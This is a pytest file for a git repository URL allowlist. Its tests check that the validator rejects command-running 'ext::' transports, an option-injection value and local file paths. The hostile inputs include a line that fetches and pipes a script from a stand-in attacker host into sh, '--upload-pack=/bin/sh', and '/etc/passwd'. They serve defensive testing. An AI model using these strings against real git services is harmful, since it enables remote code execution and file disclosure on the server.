"""Tests for the repository URL allowlist (zanshin/services/git_url.py).

The important case is `ext::`: git resolves `<transport>::<address>` through a
remote helper, and the built-in `ext` helper runs its address as a shell
command — so an unchecked URL turns "add a repository" into remote code
execution as the Zanshin process.
"""
import pytest

from zanshin.services.git_url import InvalidRepositoryUrlError, validate_repo_url


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/org/repo.git",
        "http://gitlab.internal/org/repo.git",
        "ssh://git@github.com/org/repo.git",
        "git@github.com:org/repo.git",
        "gitlab-ci-token@gitlab.internal:group/sub/repo.git",
    ],
)
def test_accepts_fetch_only_transports(url):
    assert validate_repo_url(url) == url


def test_strips_surrounding_whitespace():
    assert validate_repo_url("  https://github.com/org/repo.git \n") == "https://github.com/org/repo.git"


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl attacker.tld/x | sh'",
        "ext::whoami",
        "fd::7",
        "transport::whatever",
    ],
)
def test_rejects_remote_helper_transports(url):
    with pytest.raises(InvalidRepositoryUrlError):
        validate_repo_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "--upload-pack=/bin/sh",
        "-o something",
    ],
)
def test_rejects_urls_git_would_read_as_options(url):
    with pytest.raises(InvalidRepositoryUrlError):
        validate_repo_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",
        "git://github.com/org/repo.git",
        "/etc/passwd",
        "https://example.com/repo with space.git",
        "https://example.com/repo\nx.git",
        "",
        "   ",
        None,
    ],
)
def test_rejects_everything_else(url):
    with pytest.raises(InvalidRepositoryUrlError):
        validate_repo_url(url)


def test_error_is_a_value_error():
    """The UI layer reports `str(e)` from a `ValueError`; keeping the
    hierarchy means the reason reaches the operator unchanged."""
    assert issubclass(InvalidRepositoryUrlError, ValueError)
